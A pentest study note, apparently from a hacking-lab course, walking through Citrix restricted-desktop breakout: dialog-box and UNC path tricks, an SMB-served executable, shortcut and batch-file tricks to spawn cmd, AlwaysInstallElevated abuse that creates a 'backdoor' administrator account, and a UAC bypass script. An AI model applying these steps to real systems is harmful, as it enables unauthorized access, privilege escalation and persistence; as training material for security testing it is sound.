# Citrix Breakout

{% hint style="warning" %}
**Citrix sur Windows**, c’est une **technologie d’accès à distance** qui permet à un utilisateur d’accéder à des applications ou des bureaux hébergés sur un **serveur centralisé** (souvent en datacenter ou cloud) **depuis un poste client Windows**.

***

🔍 **Définition rapide**

> **Citrix Virtual Apps and Desktops (anciennement XenApp/XenDesktop)** permet de **publier des applications** ou **bureaux complets** sur des clients distants (Windows, Linux, macOS, mobile), tout en exécutant ces applications **sur un serveur distant**.

***

🧠 **À quoi ça sert ?**

* **Virtualisation d'applications** : Lancer des applications comme si elles étaient locales, alors qu'elles tournent sur un serveur distant.
* **Bureau à distance (VDI)** : Se connecter à un bureau Windows complet hébergé à distance.
* **Accès sécurisé** : L’utilisateur ne télécharge pas les fichiers ; tout reste sur le serveur.
* **Travail à distance / BYOD** : Les employés peuvent utiliser leur propre appareil pour accéder à leur environnement pro.
* Des plateformes comme **Terminal Services, Citrix, AWS AppStream**, etc., sont utilisées pour fournir un accès distant sécurisé.
* Ces environnements sont souvent **"verrouillés"** pour empêcher les utilisateurs d'accéder aux outils système sensibles (comme CMD ou PowerShell).
* Le but est de limiter les risques venant de comptes compromis ou d'employés malveillants.

***
{% endhint %}

### <mark style="color:red;">Bypassing Path Restrictions</mark>

🔹 **Accès bloqué** :\
Quand on essaie d'ouvrir `C:\Users` avec l'Explorateur de fichiers, on obtient une **erreur**.\
👉 Cela montre que **des règles de sécurité (GPO)** sont en place pour empêcher l'accès aux dossiers du disque `C:\`.

🔹 **Contournement possible** :\
Même si l'accès normal est bloqué, on peut utiliser **des fenêtres de dialogue Windows** (par exemple, la boîte pour ouvrir/sauvegarder un fichier) pour **contourner** ces restrictions.

🔹 **Objectif après avoir obtenu une boîte de dialogue** :\
Une fois qu'on a une **fenêtre de dialogue**, on peut essayer de **naviguer manuellement** vers un dossier du système qui contient des programmes importants, comme **`cmd.exe`** (l'invite de commandes).

🔹 **Technique utilisée** :\
Dans la boîte de dialogue, on peut **taper directement** le chemin complet (par exemple `C:\Windows\System32\cmd.exe`) dans le **champ du nom de fichier** pour tenter d'ouvrir un programme même si l'accès est normalement restreint.

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

Avec la fenêtre de dialogue ouverte dans **Paint**, on peut saisir le chemin réseau UNC suivant dans le champ "Nom du fichier" :\
`\\127.0.0.1\c$\users\pmorgan`,

<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

***

### <mark style="color:red;">Accessing SMB share from restricted environment</mark>

```shell-session
root@ubuntu:/home/htb-student/Tools# smbserver.py -smb2support share $(pwd)
```

<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
En raison des restrictions dans l'Explorateur de fichiers, la copie directe de fichiers n'est pas possible. Cependant, une approche alternative consiste à faire un clic droit sur les exécutables et à les lancer. Par exemple, en faisant un clic droit sur le binaire **pwn.exe** et en sélectionnant **Ouvrir**, cela nous invitera à l'exécuter et une console **cmd** s'ouvrira.
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

```c
#include <stdlib.h>
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
```

<figure><img src="../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

***

### <mark style="color:red;">Alternate Explorer</mark>

<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

[Explorer++](https://explorerplusplus.com/) is highly recommended and frequently used in such situations due to its speed, user-friendly interface, and portability. Being a portable application, it can be executed directly without the need for installation, making it a convenient choice for bypassing folder restrictions set by group policy.

***

### <mark style="color:red;">Alternate Registry Editors</mark>

<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

***

### <mark style="color:red;">Modify existing shortcut file</mark>

<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

* Within the `Target` field, modify the path to the intended folder for access.&#x20;

<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

* Execute the Shortcut and cmd will be spawned&#x20;

<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Dans les cas où un fichier de raccourci existant est indisponible, il existe des méthodes alternatives à envisager. L'une des options consiste à transférer un fichier de raccourci existant en utilisant un serveur SMB. Alternativement, nous pouvons créer un nouveau fichier de raccourci à l'aide de PowerShell, comme mentionné dans la section **Interaction avec les utilisateurs** sous l'onglet **Génération d'un fichier .lnk malveillant**. Ces approches offrent de la polyvalence pour atteindre nos objectifs tout en travaillant avec des fichiers de raccourci.
{% endhint %}

***

### <mark style="color:red;">Script Execution</mark>

&#x20;.bat, .vbs ou .ps sont configurées pour exécuter automatiquement leur code en utilisant leurs interprètes respectifs

1. Create a new text file and name it "evil.bat".
2. Open "evil.bat" with a text editor such as Notepad.
3. Input the command "cmd" into the file.&#x20;

<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

4. Save the file.

Upon executing the "evil.bat" file, it will initiate a Command Prompt window. This can be useful for performing various command-line operations.

***

### <mark style="color:red;">Escalating Privileges</mark>

&#x20;[Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) and [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1)&#x20;

Using `PowerUp.ps1`, we find that [Always Install Elevated](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated) key is present and set.

We can also validate this using the Command Prompt by querying the corresponding registry keys:

{% code fullWidth="true" %}
```cmd-session
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
{% endcode %}

{% code fullWidth="true" %}
```powershell-session
PS C:\Users\pmorgan\Desktop> Import-Module .\PowerUp.ps1
PS C:\Users\pmorgan\Desktop> Write-UserAddMSI
```
{% endcode %}

Now we can execute `UserAdd.msi` and create a new user `backdoor:T3st@123` under Administrators group. Note that giving it a password that doesn’t meet the password complexity criteria will throw an error.

<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

```cmd-session
C:\> runas /user:backdoor cmd

Enter the password for backdoor: T3st@123
Attempting to start cmd as user "VDESKTOP3\backdoor" ...
```

***

### <mark style="color:red;">Bypassing UAC</mark>

```cmd-session
C:\Windows\system32> cd C:\Users\Administrator

Access is denied.
```

Numerous [UAC bypass](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC) scripts&#x20;

```powershell-session
PS C:\Users\Public> Import-Module .\Bypass-UAC.ps1
PS C:\Users\Public> Bypass-UAC -Method UacMethodSysprep
```

<figure><img src="../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

**Additional resources worth checking:**

* [Breaking out of Citrix and other Restricted Desktop environments](https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/)
* [Breaking out of Windows Environments](https://node-security.com/posts/breaking-out-of-windows-environments/)
